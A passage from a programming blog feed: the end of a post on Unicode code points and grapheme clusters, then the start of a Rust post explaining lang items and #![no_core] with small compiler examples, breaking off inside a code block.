<p>Backspace can gobble multiple code points at once too, but the heuristics are different. The reason
behind this is that backspace needs to mirror the act of typing, and while typing sometimes
constructs multi-codepoint characters, backspace decomposes it piece by piece. In cases where a
multi-codepoint &ldquo;character&rdquo; <em>can</em> be logically decomposed (e.g. &ldquo;letter + accent&rdquo;), backspace will
decompose it, by removing the accent or whatever. But some multi-codepoint characters are not
&ldquo;constructions&rdquo; of general concepts that should be exposed to the user. For example, a user should
never need to know that the &ldquo;🇺🇸&rdquo; flag emoji is made of <code>🇺</code> + <code>🇸</code>, and hitting backspace on it should
delete both codepoints. Similarly, variation selectors and other such code points shouldn&rsquo;t
be treated as their own unit when backspacing.</p>

<p>On my Mac most builtin apps (which I presume use the OSX UI toolkits) seem to use the same
heuristics that Firefox/Chrome use for selection for both selection and backspace. While the
treatment of code points in editing contexts is not consistent, it seems like applications
consistently do not consider code points as &ldquo;editing units&rdquo;.</p>

<p>Now, it is true that you often need <em>some</em> way to index a string. For example, if you have a large
document and need to represent a slice of it. This could be a user-selection, or something delimeted
by markup. Basically, you&rsquo;ve already gone through the document and have a section you want to be
able to refer to later without copying it out.</p>

<p>However, you don&rsquo;t need code point indexing here, byte
indexing works fine! UTF8 is designed so that you can check if you&rsquo;re on a code point boundary even
if you just byte-index directly. It does this by restricting the kinds of bytes allowed. One-byte
code points never have the high bit set (ASCII). All other code points have the high bit set in each
byte. The first byte of multibyte codepoints always starts with a sequence that specifies the number
of bytes in the codepoint, and such sequences can&rsquo;t be found in the lower-order bytes of any
multibyte codepoint. You can see this visually in the table <a href="https://en.wikipedia.org/wiki/UTF-8#Description">here</a>. The upshot of all this
is that you just need to check the current byte if you want to be sure you&rsquo;re on a codepoint
boundary, and if you receive an arbitrarily byte-sliced string, you will not mistake it for
something else. It&rsquo;s not possible to have a valid code point be a subslice of another, or form a
valid code point by subslicing a sequence of two different ones by cutting each in half.</p>

<p>So all you need to do is keep track of the byte indices, and use them for slicing it later.</p>

<p>All in all, it&rsquo;s important to always remember that &ldquo;code point&rdquo; doesn&rsquo;t have intrinsic meaning. If
you need to do a segmentation operation on a string, find out what <em>exactly</em> you&rsquo;re looking for, and
what concept maps closest to that. It&rsquo;s rare that &ldquo;code point&rdquo; is the concept you&rsquo;re looking for.
In <em>most</em> cases, what you&rsquo;re looking for instead is &ldquo;grapheme cluster&rdquo;.</p>

<h2>Grapheme clusters</h2>

<p>The concept of a &ldquo;character&rdquo; is a nebulous one. Is &ldquo;&#x1100;&#x1161;&#x11A8;&rdquo; a single character, or
three? How about &ldquo;नी&rdquo;? Or &ldquo;நி&rdquo;? Or the &ldquo;👨‍❤️‍👨&rdquo; emoji<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>? Or the &ldquo;👨‍👨‍👧‍👧&rdquo; family emoji<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>?
Different scripts have different concepts which may not clearly map to the Latin notion of &ldquo;letter&rdquo;
or our programmery notion of &ldquo;character&rdquo;.</p>

<p>Unicode itself gives the term <a href="http://unicode.org/glossary/#character">&ldquo;character&rdquo;</a> multiple incompatible meanings, and as
far as I know doesn&rsquo;t use the term in any normative text.</p>

<p>Often, you need to deal with what is actually displayed to the user. A lot of terminal emulators do
this wrong, and end up messing up cursor placement. I used to use irssi-xmpp to keep my Facebook and
Gchat conversations in my IRC client, but I eventually stopped as I was increasingly chatting in
Marathi or Hindi and I prefer using the actual script over romanizing<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup>, and it would just break
my terminal<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup>. Also, they got rid of the XMPP bridge but I&rsquo;d already cut down on it by then.</p>

<p>So sometimes, you need an API querying what the font is doing. Generally, when talking about the
actual rendered image, the term &ldquo;glyph&rdquo; or &ldquo;glyph image&rdquo; is used.</p>

<p>However, you can&rsquo;t always query the font. Text itself exists independent of rendering, and sometimes
you need a rendering-agnostic way of segmenting it into &ldquo;characters&rdquo;.</p>

<p>For this, Unicode has a concept of <a href="http://unicode.org/glossary/#grapheme_cluster">&ldquo;grapheme cluster&rdquo;</a>. There&rsquo;s also &ldquo;extended grapheme
cluster&rdquo; (EGC), which is basically an updated version of the concept. In this post, whenever
I use the term &ldquo;grapheme cluster&rdquo;, I am talking about EGCs.</p>

<p>The term is defined and explored in <a href="http://www.unicode.org/reports/tr29/#Grapheme_Cluster_Boundaries">UAX #29</a>. It starts by pinning down the still-nebulous
concept of &ldquo;user-perceived character&rdquo; (&ldquo;a basic unit of a writing system for a language&rdquo;),
and then declares the concept of a &ldquo;grapheme cluster&rdquo; to be an approximation to this notion
that we can determine programmatically.</p>

<p>A rough definition of grapheme cluster is a &ldquo;horizontally segmentable unit of text&rdquo;.</p>

<p>The spec goes into detail as to the exact algorithm that segments text at grapheme cluster
boundaries. All of the examples I gave in the first paragraph of this section are single grapheme
clusters. So is &ldquo;ᄀᄀᄀ각ᆨᆨ&rdquo; (or &ldquo;ᄀᄀᄀ&#x1100;&#x1161;&#x11A8;ᆨᆨ&rdquo;), which apparently is considered a
single syllable block in Hangul even though it is not of the typical form of leading consonant +
vowel + optional tail consonant, but is not something you&rsquo;d see in modern Korean. The spec
explicitly talks of this case so it seems to be on purpose. I like this string because nothing I
know of renders it as a single glyph; so you can easily use it to tell if a particular segmentation-
aware operation uses grapheme clusters as segmentation. If you try and select it, in most browsers
you will be forced to select the whole thing, but backspace will delete the jamos one by one. For
the second string, backspace will decompose the core syllable block too (in the first string the
syllable block &#x1100;&#x1161;&#x11A8; is &ldquo;precomposed&rdquo; as a single code point, in the second one I
built it using combining jamos).</p>

<p>Basically, unless you have very specific requirements or are able to query the font, use an API that
segments strings into grapheme clusters wherever you need to deal with the notion of &ldquo;character&rdquo;.</p>

<h2>Language defaults</h2>

<p>Now, a lot of languages by default are now using Unicode-aware encodings. This is great. It gets rid
of the misconception that characters are one byte long.</p>

<p>But it doesn&rsquo;t get rid of the misconception that user-perceived characters are one code point long.</p>

<p>There are only two languages I know of which handle this well: Swift and Perl 6. I don&rsquo;t know much
about Perl 6&rsquo;s thing so I can&rsquo;t really comment on it, but I am really happy with what Swift does:</p>

<p>In Swift, the <code>Character</code> type is an extended grapheme cluster. This does mean that a
character itself is basically a string, since EGCs can be arbitrarily many code points long.</p>

<p>All the APIs by default deal with EGCs. The length of a string is the number of EGCs in it. They
are indexed by EGC. Iteration yields EGCs. The default comparison algorithm uses unicode
canonical equivalence, which I think is kind of neat. Of course, APIs that work with code
points are exposed too, you can iterate over the code points using <code>.unicodeScalars</code>.</p>

<p>The internal encoding itself is &hellip; weird (and as far as I can tell not publicly exposed), but as a
higher level language I think it&rsquo;s fine to do things like that.</p>

<p>I strongly feel that languages should be moving in this direction, having defaults involving
grapheme clusters.</p>

<p>Rust, for example, gets a lot of things right &ndash; it has UTF-8 strings. It internally uses byte
indices in slices. Explicit slicing usually uses byte indices too, and will panic if out of bounds.
The non-O(1) methods are all explicit, since you will use an iterator to perform the operation (E.g.
<code>.chars().nth(5)</code>). This encourages people to <em>think</em> about the cost, and it also  encourages people
to coalesce the cost with nearby iterations &ndash; if you are going to do multiple <code>O(n)</code> things, do
them in a single iteration! Rust <code>char</code>s represent code points. <code>.char_indices()</code> is
a useful string iteration method that bridges the gap between byte indexing and code points.</p>

<p>However, while the documentation does mention grapheme clusters, the stdlib is not aware of the
concept of grapheme clusters at all. The default &ldquo;fundamental&rdquo; unit of the string in Rust is
a code point, and the operations revolve around that. If you want grapheme clusters, you
may use <a href="https://unicode-rs.github.io/unicode-segmentation/unicode_segmentation/trait.UnicodeSegmentation.html#tymethod.graphemes"><code>unicode-segmentation</code></a></p>

<p>Now, Rust is a systems programming language and it just wouldn&rsquo;t do to have expensive grapheme
segmentation operations all over your string defaults. I&rsquo;m very happy that the expensive <code>O(n)</code>
operations are all only possible with explicit acknowledgement of the cost. So I do think that going
the Swift route would be counterproductive for Rust. Not that it <em>can</em> anyway, due to backwards
compatibility :)</p>

<p>But I would prefer if the grapheme segmentation methods were in the stdlib (they used to be).
This is probably not something that will happen, though I should probably push for the unicode
crates being move into the nursery at least.</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>Emoji may not render as a single glyph depending on the font.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>While writing this paragraph I discovered that wrapping text that contains lots of family emoji hangs Sublime. Neat.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>Part of the reason here is that I just find romanization confusing. There are some standardized ways to romanize which don&rsquo;t get used much. My friends and I romanize one way, different from the standardizations. My family members romanize things a completely different way and it&rsquo;s a bit hard to read. Then again, romanization <em>does</em> hide the fact that my spelling in Hindi is atrocious :)<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
<li id="fn:4">
<p>It&rsquo;s possible to make work. You need a good terminal emulator, with the right settings, the right settings in your env vars, the right settings in irssi, and the right settings in screen. I think my current setup works well with non-ascii text but I&rsquo;m not sure what I did to make it happen.<a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Rust Tidbits: What Is a Lang Item?]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/01/11/rust-tidbits-what-is-a-lang-item/"/>
    <updated>2017-01-11T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/01/11/rust-tidbits-what-is-a-lang-item</id>
    <content type="html"><![CDATA[<p><em>Rust is not a simple language. As with any such language, it has many little tidbits of complexity
that most folks aren&rsquo;t aware of. Many of these tidbits are ones which may not practically matter
much for everyday Rust programming, but are interesting to know. Others may be more useful. I&rsquo;ve
found that a lot of these aren&rsquo;t documented anywhere (not that they always should be), and sometimes
depend on knowledge of compiler internals or history. As a fan of programming trivia myself, I&rsquo;ve
decided to try writing about these things whenever I come across them. &ldquo;Tribal Knowledge&rdquo; shouldn&rsquo;t
be a thing in a programming community; and trivia is fun!</em></p>

<p>Previously in tidbits: <a href="http://manishearth.github.io/blog/2017/01/10/rust-tidbits-box-is-special/"><code>Box</code> is Special</a></p>

<p>Last time I talked about <code>Box&lt;T&gt;</code> and how it is a special snowflake. Corey <a href="https://www.reddit.com/r/rust/comments/5nb86x/rust_tidbits_box_is_special/dca4y6n/?utm_content=permalink&amp;utm_medium=front&amp;utm_source=reddit&amp;utm_name=rust">asked</a> that
I write more about lang items, which are basically all of the special snowflakes in the stdlib.</p>

<p>So what <em>is</em> a lang item? Lang items are a way for the stdlib (and libcore) to define types, traits,
functions, and other items which the compiler needs to know about.</p>

<p>For example, when you write <code>x + y</code>, the compiler will effectively desugar that into
<code>Add::add(x, y)</code><sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. How did it know what trait to call? Did it just insert a call to
<code>::core::Add::add</code> and hope the trait was defined there? This is what C++ does;
the Itanium ABI spec expects functions of certain names
to just <em>exist</em>, which the compiler is supposed to call in various cases. The
<code>__cxa_guard_*</code> functions from C++s deferred-initialization local statics (which
I&rsquo;ve <a href="http://manishearth.github.io/blog/2015/06/26/adventures-in-systems-programming-c-plus-plus-local-statics/">explored in the past</a>) are an example of this. You&rsquo;ll find that the spec is
full of similar <code>__cxa</code> functions. While the spec just expects certain types,
e.g. <code>std::type_traits</code> (&ldquo;Type properties&rdquo; § 20.10.4.3), to be magic and exist in certain locations,
the compilers seem to implement them using intrinsics like <code>__is_trivial&lt;T&gt;</code> which aren&rsquo;t defined
in C++ code at all. So C++ compilers have a mix of solutions here, they partly insert calls
to known ABI functions, and they partly implement &ldquo;special&rdquo; types via intrinsics which
are detected and magicked when the compiler comes across them.</p>

<p>However, this is not Rust&rsquo;s solution. It does not care what the <code>Add</code> trait is named or where it is
placed. Instead, it knew where the trait for addition was located because <a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/ops.rs#L243"><em>we told it</em></a>.
When you put <code>#[lang = "add"]</code> on a trait, the compiler knows to call <code>YourTrait::add(x, y)</code> when it
encounters the addition operator. Of course, usually the compiler will already have been told about
such a trait since libcore is usually the first library in the pipeline. If you want to actually use
this, you need to <em>replace libcore</em>.</p>

<p>Huh? You can&rsquo;t do that, can you?</p>

<p>It&rsquo;s not a big secret that you can compile rust without the stdlib using
<a href="https://doc.rust-lang.org/book/no-stdlib.html"><code>#![no_std]</code></a>. This is useful in cases when you are on an embedded system and can&rsquo;t
rely on an allocator existing. It&rsquo;s also useful for writing your own alternate stdlib, though
that&rsquo;s not something folks do often. Of course, libstd itself <a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libstd/lib.rs#L213-L214">uses <code>#![no_std]</code></a>,
because without it the compiler will happily inject an <code>extern crate std</code> while trying to compile
libstd and the universe will implode.</p>

<p>What&rsquo;s less known is that you can do the same thing with libcore, via <code>#![no_core]</code>. And, of course,
libcore <a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/lib.rs#L65">uses it</a> to avoid the cyclic dependency. Unlike <code>#![no_std]</code>, <code>no_core</code> is
a nightly-only feature that we may never stabilize<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup>. <code>#![no_core]</code> is something that&rsquo;s basically
only to be used if you <em>are</em> libcore (or you are an alternate Rust stdlib/core implementation
trying to emulate it).</p>

<p>Still, it&rsquo;s possible to write a working Rust binary in <code>no_core</code> mode:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="err">#</span><span class="o">!</span><span class="p">[</span><span class="n">feature</span><span class="p">(</span><span class="n">no_core</span><span class="p">)]</span>
</span><span class='line'><span class="err">#</span><span class="o">!</span><span class="p">[</span><span class="n">feature</span><span class="p">(</span><span class="n">lang_items</span><span class="p">)]</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Look at me.</span>
</span><span class='line'><span class="c1">// Look at me.</span>
</span><span class='line'><span class="c1">// I&#39;m the libcore now.</span>
</span><span class='line'><span class="err">#</span><span class="o">!</span><span class="p">[</span><span class="n">no_core</span><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Tell the compiler to link to appropriate runtime libs</span>
</span><span class='line'><span class="c1">// (This way I don&#39;t have to specify `-l` flags explicitly)</span>
</span><span class='line'><span class="cp">#[cfg(target_os = </span><span class="s">&quot;linux&quot;</span><span class="cp">)]</span>
</span><span class='line'><span class="cp">#[link(name = </span><span class="s">&quot;c&quot;</span><span class="cp">)]</span>
</span><span class='line'><span class="k">extern</span> <span class="p">{}</span>
</span><span class='line'><span class="cp">#[cfg(target_os = </span><span class="s">&quot;macos&quot;</span><span class="cp">)]</span>
</span><span class='line'><span class="cp">#[link(name = </span><span class="s">&quot;System&quot;</span><span class="cp">)]</span>
</span><span class='line'><span class="k">extern</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// Compiler needs these to proceed</span>
</span><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;sized&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">pub</span> <span class="k">trait</span> <span class="nb">Sized</span> <span class="p">{}</span>
</span><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;copy&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">pub</span> <span class="k">trait</span> <span class="n">Copy</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// `main` isn&#39;t the actual entry point, `start` is.</span>
</span><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;start&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">fn</span> <span class="n">start</span><span class="p">(</span><span class="n">_main</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">,</span> <span class="n">_argc</span><span class="o">:</span> <span class="n">isize</span><span class="p">,</span> <span class="n">_argv</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">isize</span> <span class="p">{</span>
</span><span class='line'>    <span class="c1">// we can&#39;t really do much in this benighted hellhole of</span>
</span><span class='line'>    <span class="c1">// an environment without bringing in more libraries.</span>
</span><span class='line'>    <span class="c1">// We can make syscalls, segfault, and set the exit code.</span>
</span><span class='line'>    <span class="c1">// To be sure that this actually ran, let&#39;s set the exit code.</span>
</span><span class='line'>    <span class="mi">42</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="c1">// still need a main unless we want to use `#![no_main]`</span>
</span><span class='line'><span class="c1">// won&#39;t actually get called; `start()` is supposed to call it</span>
</span><span class='line'><span class="k">fn</span> <span class="n">main</span><span class="p">()</span> <span class="p">{}</span>
</span></code></pre></td></tr></table></div></figure>


<p>If you run this, the program will exit with exit code 42.</p>

<p>Note that this already adds two lang items. <code>Sized</code> and <code>Copy</code>. It&rsquo;s usually worth
<a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/marker.rs#L88-L94">looking at the lang item in libcore</a> and copying it over unless you want to make
tweaks. Beware that tweaks may not always work; not only does the compiler expect the lang item
to exist, it expects it to make sense. There are properties of the lang item that it assumes
are true, and failure to provide an appropriate lang item may cause the compiler to assert
without a useful error message. In this case I do have a tweak, since
the original definition of <code>Copy</code> is <code>pub trait Copy: Clone {}</code>, but I know that this tweak
will work.</p>

<p>Lang items are usually only required when you do an operation which needs them. There are 72 non-
deprecated lang items and we only had to define three of them here. &ldquo;start&rdquo; is necessary to, well,
start executables, and <code>Copy</code>/<code>Sized</code> are very crucial to how the compiler reasons about types and
must exist.</p>

<p>But let&rsquo;s try doing something that will trigger a lang item to be required:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">pub</span> <span class="k">static</span> <span class="n">X</span><span class="o">:</span> <span class="kt">u8</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Rust will immediately complain:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="err">$</span> <span class="n">rustc</span> <span class="n">test</span><span class="p">.</span><span class="n">rs</span>
</span><span class='line'><span class="n">error</span><span class="o">:</span> <span class="n">requires</span> <span class="err">`</span><span class="n">sync</span><span class="err">`</span> <span class="n">lang_item</span>
</span></code></pre></td></tr></table></div></figure>


<p>This is because Rust wants to enforce that types in statics (which can be accessed concurrently)
are safe when accessed concurrently, i.e., they implement <code>Sync</code>. We haven&rsquo;t defined <code>Sync</code> yet,
so Rust doesn&rsquo;t know how to enforce this restruction. The <code>Sync</code> trait is defined with the &ldquo;sync&rdquo;
lang item, so we need to do:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">pub</span> <span class="k">static</span> <span class="n">X</span><span class="o">:</span> <span class="kt">u8</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;sync&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">pub</span> <span class="k">unsafe</span> <span class="k">trait</span> <span class="n">Sync</span> <span class="p">{}</span>
</span><span class='line'><span class="k">unsafe</span> <span class="k">impl</span> <span class="n">Sync</span> <span class="k">for</span> <span class="kt">u8</span> <span class="p">{}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Note that the trait doesn&rsquo;t have to be called <code>Sync</code> here, any trait name would work. This
definition is also a slight <a href="https://github.com/rust-lang/rust/blob/2782e8f8fcefdce77c5e0dd0846c15c4c5103d84/src/libcore/marker.rs#L343-L351">departure from the one in the stdlib</a>, and in general you
should include the auto trait impl (instead of specifically using <code>unsafe impl Sync for u8 {}</code>)
since the compiler may assume it exists. Our code is small enough for this to not matter.</p>

<p>Alright, let&rsquo;s try defining our own addition trait as before. First, let&rsquo;s see
what happens if we try to add a struct when addition isn&rsquo;t defined:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">struct</span> <span class="n">Foo</span><span class="p">;</span>
</span><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;start&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">fn</span> <span class="n">start</span><span class="p">(</span><span class="n">_main</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">,</span> <span class="n">_argc</span><span class="o">:</span> <span class="n">isize</span><span class="p">,</span> <span class="n">_argv</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">isize</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">Foo</span> <span class="o">+</span> <span class="n">Foo</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We get an error:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="err">$</span> <span class="n">rustc</span> <span class="n">test</span><span class="p">.</span><span class="n">rs</span>
</span><span class='line'><span class="n">error</span><span class="p">[</span><span class="n">E0369</span><span class="p">]</span><span class="o">:</span> <span class="n">binary</span> <span class="n">operation</span> <span class="err">`</span><span class="o">+</span><span class="err">`</span> <span class="n">cannot</span> <span class="kr">be</span> <span class="n">applied</span> <span class="n">to</span> <span class="k">type</span> <span class="err">`</span><span class="n">Foo</span><span class="err">`</span>
</span><span class='line'>  <span class="o">--&gt;</span> <span class="n">test</span><span class="p">.</span><span class="n">rs</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">5</span>
</span><span class='line'>   <span class="o">|</span>
</span><span class='line'><span class="mi">33</span> <span class="o">|</span>     <span class="n">Foo</span> <span class="o">+</span> <span class="n">Foo</span>
</span><span class='line'>   <span class="o">|</span>     <span class="o">^^^</span>
</span><span class='line'>   <span class="o">|</span>
</span><span class='line'><span class="n">note</span><span class="o">:</span> <span class="n">an</span> <span class="n">implementation</span> <span class="n">of</span> <span class="err">`</span><span class="n">std</span><span class="o">::</span><span class="n">ops</span><span class="o">::</span><span class="nb">Add</span><span class="err">`</span> <span class="n">might</span> <span class="kr">be</span> <span class="n">missing</span> <span class="k">for</span> <span class="err">`</span><span class="n">Foo</span><span class="err">`</span>
</span><span class='line'>  <span class="o">--&gt;</span> <span class="n">test</span><span class="p">.</span><span class="n">rs</span><span class="o">:</span><span class="mi">33</span><span class="o">:</span><span class="mi">5</span>
</span><span class='line'>   <span class="o">|</span>
</span><span class='line'><span class="mi">33</span> <span class="o">|</span>     <span class="n">Foo</span> <span class="o">+</span> <span class="n">Foo</span>
</span><span class='line'>   <span class="o">|</span>     <span class="o">^^^</span>
</span><span class='line'>
</span><span class='line'><span class="n">error</span><span class="o">:</span> <span class="n">aborting</span> <span class="n">due</span> <span class="n">to</span> <span class="n">previous</span> <span class="n">error</span>
</span></code></pre></td></tr></table></div></figure>


<p>It is interesting to note that here the compiler <em>did</em> refer to <code>Add</code> by its path.
This is because the diagnostics in the compiler are free to assume that libcore
exists. However, the actual error just noted that it doesn&rsquo;t know how to add two
<code>Foo</code>s. But we can tell it how!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;add&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">trait</span> <span class="n">MyAdd</span><span class="o">&lt;</span><span class="n">RHS</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">type</span> <span class="n">Output</span><span class="p">;</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="o">:</span> <span class="n">RHS</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Self</span><span class="o">::</span><span class="n">Output</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">impl</span> <span class="n">MyAdd</span><span class="o">&lt;</span><span class="n">Foo</span><span class="o">&gt;</span> <span class="k">for</span> <span class="n">Foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">type</span> <span class="n">Output</span> <span class="o">=</span> <span class="n">isize</span><span class="p">;</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">add</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">other</span><span class="o">:</span> <span class="n">Foo</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">isize</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="mi">42</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Foo</span><span class="p">;</span>
</span><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;start&quot;</span><span class="cp">]</span>
</span><span class='line'><span class="k">fn</span> <span class="n">start</span><span class="p">(</span><span class="n">_main</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">,</span> <span class="n">_argc</span><span class="o">:</span> <span class="n">isize</span><span class="p">,</span> <span class="n">_argv</span><span class="o">:</span> <span class="o">*</span><span class="kr">const</span> <span class="o">*</span><span class="kr">const</span> <span class="kt">u8</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">isize</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">Foo</span> <span class="o">+</span> <span class="n">Foo</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>This will compile fine and the exit code of the program will be 42.</p>

<p>An interesting bit of behavior is what happens if we try to add two numbers. It will give us the
same kind of error, even though I mentioned before that the addition of concrete primitives doesn&rsquo;t
go through <code>Add::add</code>. However, any addition operation still checks if <code>Add::add</code> is implemented,
even though it won&rsquo;t get <em>used</em> in the case of a primitive. We can even verify this!</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="cp">#[lang = </span><span class="s">&quot;add&quot;</span><span class="cp">]</span>
